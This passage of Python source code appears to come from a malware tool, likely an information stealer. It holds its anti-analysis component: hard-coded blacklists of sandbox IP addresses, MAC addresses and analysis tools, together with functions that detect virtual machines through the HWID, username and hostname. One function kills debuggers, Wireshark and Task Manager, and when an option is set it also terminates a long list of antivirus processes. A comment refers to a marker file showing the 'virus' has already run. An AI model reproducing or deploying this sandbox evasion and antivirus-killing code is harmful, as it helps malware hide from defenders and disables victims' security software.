'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209',
                               '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
                                '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        
        self.Antiviruses = ['emet_agent.exe', 'emet_service.exe', 'firesvc.exe', 'firetray.exe', 'hipsvc.exe', 'mfevtps.exe', 'mcafeefire.exe', 'scan32.exe', 'shstat.exe', 'tbmon.exe', 'vstskmgr.exe', 'engineserver.exe', 'mfevtps.exe', 'mfeann.exe', 'mcscript.exe', 'updaterui.exe', 'udaterui.exe', 'naprdmgr.exe', 'frameworkservice.exe', 'cleanup.exe', 'cmdagent.exe', 'frminst.exe', 'mcscript_inuse.exe', 'mctray.exe', 'mcshield.exe', 'AAWTray.exe', 'Ad-Aware.exe', 'MSASCui.exe', '_avp32.exe', '_avpcc.exe', '_avpm.exe', 'aAvgApi.exe', 'ackwin32.exe', 'adaware.exe', 'advxdwin.exe', 'agentsvr.exe', 'agentw.exe', 'alertsvc.exe', 'alevir.exe', 'alogserv.exe', 'amon9x.exe', 'anti-trojan.exe', 'antivirus.exe', 'ants.exe', 'apimonitor.exe', 'aplica32.exe', 'apvxdwin.exe', 'arr.exe', 'atcon.exe', 'atguard.exe', 'atro55en.exe', 'atupdater.exe', 'atwatch.exe', 'au.exe', 'aupdate.exe', 'auto-protect.nav80try.exe', 'autodown.exe', 'autotrace.exe', 'autoupdate.exe', 'avconsol.exe', 'ave32.exe', 'avgcc32.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgrsx.exe', 'avgserv.exe', 'avgserv9.exe', 'avguard.exe', 'avgw.exe', 'avkpop.exe', 'avkserv.exe', 'avkservice.exe', 'avkwctl9.exe', 'avltmain.exe', 'avnt.exe', 'avp.exe', 'avp.exe', 'avp32.exe', 'avpcc.exe', 'avpdos32.exe', 'avpm.exe', 'avptc32.exe', 'avpupd.exe', 'avsched32.exe', 'avsynmgr.exe', 'avwin.exe', 'avwin95.exe', 'avwinnt.exe', 'avwupd.exe', 'avwupd32.exe', 'avwupsrv.exe', 'avxmonitor9x.exe', 'avxmonitornt.exe', 'avxquar.exe', 'backweb.exe', 
'bargains.exe', 'bd_professional.exe', 'beagle.exe', 'belt.exe', 'bidef.exe', 'bidserver.exe', 'bipcp.exe', 'bipcpevalsetup.exe', 'bisp.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'blss.exe', 'bootconf.exe', 'bootwarn.exe', 'borg2.exe', 'bpc.exe', 'brasil.exe', 'bs120.exe', 'bundle.exe', 'bvt.exe', 'ccapp.exe', 'ccevtmgr.exe', 'ccpxysvc.exe', 'ccsvchst.exe', 'cdp.exe', 'cfd.exe', 'cfgwiz.exe', 'cfiadmin.exe', 'cfiaudit.exe', 'cfinet.exe', 'cfinet32.exe', 'claw95.exe', 'claw95cf.exe', 'clean.exe', 'cleaner.exe', 'cleaner3.exe', 'cleanpc.exe', 'click.exe', 'cmesys.exe', 'cmgrdian.exe', 'cmon016.exe', 'connectionmonitor.exe', 'cpd.exe', 'cpf9x206.exe', 'cpfnt206.exe', 'ctrl.exe', 'cv.exe', 'cwnb181.exe', 'cwntdwmo.exe', 'datemanager.exe', 'dcomx.exe', 'defalert.exe', 'defscangui.exe', 'defwatch.exe', 'deputy.exe', 'divx.exe', 'dllcache.exe', 'dllreg.exe', 'doors.exe', 'dpf.exe', 'dpfsetup.exe', 'dpps2.exe', 'drwatson.exe', 'drweb32.exe', 'drwebupw.exe', 'dssagent.exe', 'dvp95.exe', 'dvp95_0.exe', 'ecengine.exe', 'efpeadm.exe', 'emsw.exe', 'ent.exe', 'esafe.exe', 'escanhnt.exe', 'escanv95.exe', 'espwatch.exe', 'ethereal.exe', 'etrustcipe.exe', 'evpn.exe', 'exantivirus-cnet.exe', 'exe.avxw.exe', 'expert.exe', 'explore.exe', 'f-agnt95.exe', 'f-prot.exe', 'f-prot95.exe', 'f-stopw.exe', 'fameh32.exe', 
'fast.exe', 'fch32.exe', 'fih32.exe', 'findviru.exe', 'firewall.exe', 'fnrb32.exe', 'fp-win.exe', 'fp-win_trial.exe', 'fprot.exe', 'frw.exe', 'fsaa.exe', 'fsav.exe', 'fsav32.exe', 'fsav530stbyb.exe', 'fsav530wtbyb.exe', 'fsav95.exe', 'fsgk32.exe', 'fsm32.exe', 'fsma32.exe', 'fsmb32.exe', 'gator.exe', 'gbmenu.exe', 'gbpoll.exe', 
'generics.exe', 'gmt.exe', 'guard.exe', 'guarddog.exe', 'hacktracersetup.exe', 'hbinst.exe', 'hbsrv.exe', 'hotactio.exe', 'hotpatch.exe', 'htlog.exe', 'htpatch.exe', 'hwpe.exe', 'hxdl.exe', 'hxiul.exe', 'iamapp.exe', 'iamserv.exe', 'iamstats.exe', 'ibmasn.exe', 'ibmavsp.exe', 'icload95.exe', 'icloadnt.exe', 'icmon.exe', 'icsupp95.exe', 'icsuppnt.exe', 'idle.exe', 'iedll.exe', 'iedriver.exe', 'iface.exe', 'ifw2000.exe', 'inetlnfo.exe', 'infus.exe', 'infwin.exe', 'init.exe', 'intdel.exe', 'intren.exe', 'iomon98.exe', 'istsvc.exe', 'jammer.exe', 'jdbgmrg.exe', 'jedi.exe', 'kavlite40eng.exe', 'kavpers40eng.exe', 'kavpf.exe', 'kazza.exe', 'keenvalue.exe', 'kerio-pf-213-en-win.exe', 'kerio-wrl-421-en-win.exe', 'kerio-wrp-421-en-win.exe', 'kernel32.exe', 'killprocesssetup161.exe', 'launcher.exe', 'ldnetmon.exe', 'ldpro.exe', 'ldpromenu.exe', 'ldscan.exe', 'lnetinfo.exe', 'loader.exe', 'localnet.exe', 'lockdown.exe', 'lockdown2000.exe', 'lookout.exe', 'lordpe.exe', 'lsetup.exe', 'luall.exe', 'luau.exe', 'lucomserver.exe', 'luinit.exe', 'luspt.exe', 'mapisvc32.exe', 'mcagent.exe', 'mcmnhdlr.exe', 'mcshield.exe', 'mctool.exe', 'mcupdate.exe', 'mcvsrte.exe', 'mcvsshld.exe', 'md.exe', 'mfin32.exe', 'mfw2en.exe', 'mfweng3.02d30.exe', 'mgavrtcl.exe', 'mgavrte.exe', 'mghtml.exe', 'mgui.exe', 'minilog.exe', 'mmod.exe', 'monitor.exe', 'moolive.exe', 'mostat.exe', 'mpfagent.exe', 'mpfservice.exe', 'mpftray.exe', 'mrflux.exe', 'msapp.exe', 'msbb.exe', 'msblast.exe', 'mscache.exe', 'msccn32.exe', 'mscman.exe', 'msconfig.exe', 'msdm.exe', 'msdos.exe', 'msiexec16.exe', 'msinfo32.exe', 'mslaugh.exe', 'msmgt.exe', 'msmsgri32.exe', 'mssmmc32.exe', 'mssys.exe', 'msvxd.exe', 'mu0311ad.exe', 'mwatch.exe', 'n32scanw.exe', 'nav.exe', 'navap.navapsvc.exe', 'navapsvc.exe', 'navapw32.exe', 'navdx.exe', 'navlu32.exe', 'navnt.exe', 'navstub.exe', 'navw32.exe', 'navwnt.exe', 'nc2000.exe', 'ncinst4.exe', 'ndd32.exe', 'neomonitor.exe', 'neowatchlog.exe', 'netarmor.exe', 'netd32.exe', 'netinfo.exe', 'netmon.exe', 'netscanpro.exe', 'netspyhunter-1.2.exe', 'netstat.exe', 'netutils.exe', 'nisserv.exe', 'nisum.exe', 'nmain.exe', 'nod32.exe', 'normist.exe', 'norton_internet_secu_3.0_407.exe', 'notstart.exe', 'npf40_tw_98_nt_me_2k.exe', 'npfmessenger.exe', 'nprotect.exe', 'npscheck.exe', 'npssvc.exe', 'nsched32.exe', 'nssys32.exe', 'nstask32.exe', 'nsupdate.exe', 'nt.exe', 'ntrtscan.exe', 'ntvdm.exe', 'ntxconfig.exe', 'nui.exe', 'nupgrade.exe', 'nvarch16.exe', 'nvc95.exe', 'nvsvc32.exe', 'nwinst4.exe', 'nwservice.exe', 'nwtool16.exe', 'ollydbg.exe', 'onsrvr.exe', 'optimize.exe', 'ostronet.exe', 'otfix.exe', 'outpost.exe', 'outpostinstall.exe', 'outpostproinstall.exe', 'padmin.exe', 'panixk.exe', 'patch.exe', 'pavcl.exe', 'pavproxy.exe', 'pavsched.exe', 'pavw.exe', 'pccwin98.exe', 'pcfwallicon.exe', 
'pcip10117_0.exe', 'pcscan.exe', 'pdsetup.exe', 'periscope.exe', 'persfw.exe', 'perswf.exe', 'pf2.exe', 'pfwadmin.exe', 'pgmonitr.exe', 'pingscan.exe', 'platin.exe', 'pop3trap.exe', 'poproxy.exe', 'popscan.exe', 'portdetective.exe', 'portmonitor.exe', 'powerscan.exe', 'ppinupdt.exe', 'pptbc.exe', 'ppvstop.exe', 'prizesurfer.exe', 'prmt.exe', 'prmvr.exe', 'procdump.exe', 'processmonitor.exe', 'procexplorerv1.0.exe', 'programauditor.exe', 'proport.exe', 'protectx.exe', 'pspf.exe', 'purge.exe', 'qconsole.exe', 'qserver.exe', 'rapapp.exe', 'rav7.exe', 'rav7win.exe', 'rav8win32eng.exe', 'ray.exe', 'rb32.exe', 'rcsync.exe', 'realmon.exe', 'reged.exe', 'regedit.exe', 'regedt32.exe', 'rescue.exe', 'rescue32.exe', 'rrguard.exe', 'rshell.exe', 'rtvscan.exe', 'rtvscn95.exe', 'rulaunch.exe', 'run32dll.exe', 'rundll.exe', 'rundll16.exe', 'ruxdll32.exe', 'safeweb.exe', 'sahagent.exescan32.exe', 'shstat.exe', 'tbmon.exe', 'vstskmgr.exe', 'engineserver.exe', 'mfevtps.exe', 'mfeann.exe', 'mcscript.exe', 'updaterui.exe', 'udaterui.exe', 'naprdmgr.exe', 'frameworkservice.exe', 'cleanup.exe', 'cmdagent.exe', 'frminst.exe', 'mcscript_inuse.exe', 'mctray.exe', 'mcshield.exe', 'save.exe', 'savenow.exe', 'sbserv.exe', 'sc.exe', 'scam32.exe', 'scan32.exe', 'scan95.exe', 'scanpm.exe', 'scrscan.exe', 'serv95.exe', 'setup_flowprotector_us.exe', 'setupvameeval.exe', 'sfc.exe', 'sgssfw32.exe', 'sh.exe', 'shellspyinstall.exe', 'shn.exe', 'showbehind.exe', 'smc.exe', 'sms.exe', 'smss32.exe', 
'soap.exe', 'sofi.exe', 'sperm.exe', 'spf.exe', 'sphinx.exe', 'spoler.exe', 'spoolcv.exe', 'spoolsv32.exe', 'spyxx.exe', 'srexe.exe', 'srng.exe', 'ss3edit.exe', 'ssg_4104.exe', 'ssgrate.exe', 'st2.exe', 'start.exe', 'stcloader.exe', 'supftrl.exe', 'support.exe', 'supporter5.exe', 'svchostc.exe', 'svchosts.exe', 'sweep95.exe', 'sweepnet.sweepsrv.sys.swnetsup.exe', 'symproxysvc.exe', 'symtray.exe', 'sysedit.exe', 'sysupd.exe', 'taskmg.exe', 'taskmo.exe', 'taumon.exe', 'tbscan.exe', 'tc.exe', 
'tca.exe', 'tcm.exe', 'tds-3.exe', 'tds2-98.exe', 'tds2-nt.exe', 'teekids.exe', 'tfak.exe', 'tfak5.exe', 'tgbob.exe', 'titanin.exe', 'titaninxp.exe', 'tracert.exe', 
'trickler.exe', 'trjscan.exe', 'trjsetup.exe', 'trojantrap3.exe', 'tsadbot.exe', 'tvmd.exe', 'tvtmd.exe', 'undoboot.exe', 'updat.exe', 'update.exe', 'upgrad.exe', 'utpost.exe', 'vbcmserv.exe', 'vbcons.exe', 'vbust.exe', 'vbwin9x.exe', 'vbwinntw.exe', 'vcsetup.exe', 'vet32.exe', 'vet95.exe', 'vettray.exe', 'vfsetup.exe', 'vir-help.exe', 'virusmdpersonalfirewall.exe', 'vnlan300.exe', 'vnpc3000.exe', 'vpc32.exe', 'vpc42.exe', 'vpfw30s.exe', 'vptray.exe', 'vscan40.exe', 'vscenu6.02d30.exe', 'vsched.exe', 'vsecomr.exe', 'vshwin32.exe', 'vsisetup.exe', 'vsmain.exe', 'vsmon.exe', 'vsstat.exe', 'vswin9xe.exe', 'vswinntse.exe', 'vswinperse.exe', 'w32dsm89.exe', 'w9x.exe', 'watchdog.exe', 'webdav.exe', 'webscanx.exe', 'webtrap.exe', 'wfindv32.exe', 'whoswatchingme.exe', 'wimmun32.exe', 'win-bugsfix.exe', 'win32.exe', 'win32us.exe', 'winactive.exe', 'window.exe', 'windows.exe', 'wininetd.exe', 'wininitx.exe', 'winlogin.exe', 'winmain.exe', 'winnet.exe', 'winppr32.exe', 'winrecon.exe', 'winservn.exe', 'winssk32.exe', 'winstart.exe', 'winstart001.exe', 'wintsk32.exe', 'winupdate.exe', 'wkufind.exe', 'wnad.exe', 'wnt.exe', 'wradmin.exe', 'wrctrl.exe', 'wsbgate.exe', 'wupdater.exe', 'wupdt.exe', 'wyvernworksfirewall.exe', 'xpf202en.exe', 'zapro.exe', 'zapsetup3001.exe', 'zatutor.exe', 'zonalm2601.exe', 'zonealarm.exe']

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True

        return debugging

    def check_process(self) -> None:
        for proc in process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (NoSuchProcess, AccessDenied):
                    pass
        if self.avKiller:
            for proc in process_iter():
                if any(procstr in proc.name().lower() for procstr in self.Antiviruses):
                    try:
                        proc.kill()
                    except (NoSuchProcess, AccessDenied):
                        pass


    def get_network(self):
        ip = get('https://api.ipify.org').text
        mac = ':'.join(findall('..', '%012x' % getnode()))

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self):
        try:
            hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
        except:
            hwid = "None"

        username = getenv("UserName")
        hostname = getenv("COMPUTERNAME")
        pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
        if self.oneStart:
            if (path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
                return True
        if path.exists(rf'{pathf}\windll'):
            return True

        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
            if hwid in i or username in i or hostname in i:
                return True
'''
